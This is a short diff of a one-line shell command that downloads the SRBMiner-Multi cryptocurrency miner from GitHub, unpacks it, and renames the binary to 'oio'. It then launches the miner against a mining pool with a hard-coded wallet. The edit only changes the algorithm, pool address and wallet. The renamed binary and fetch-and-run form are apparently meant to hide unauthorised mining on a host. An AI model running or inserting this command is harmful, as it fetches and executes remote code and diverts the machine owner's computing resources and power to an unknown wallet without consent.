@@ -1,1 +1,2 @@
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz && tar xf SRBMiner-Multi-2-1-0-Linux.tar.xz && cd SRBMiner-Multi-2-1-0 && mv SRBMiner-MULTI oio && ./oio --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4445 --wallet 00271B976DBEB8ED9C1DC80A18B3426458443EDC4FC9DD7D40.1 -t 4
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz && tar xf SRBMiner-Multi-2-1-0-Linux.tar.xz && cd SRBMiner-Multi-2-1-0 && mv SRBMiner-MULTI oio && ./oio --disable-gpu --algorithm yespowertide --pool stratum-eu.rplant.xyz:17059  --wallet TXgwyvgvvPFFZcdnR6wahZ5ahovqy64h84 --password c=TIDE,m=solo -t 4
+
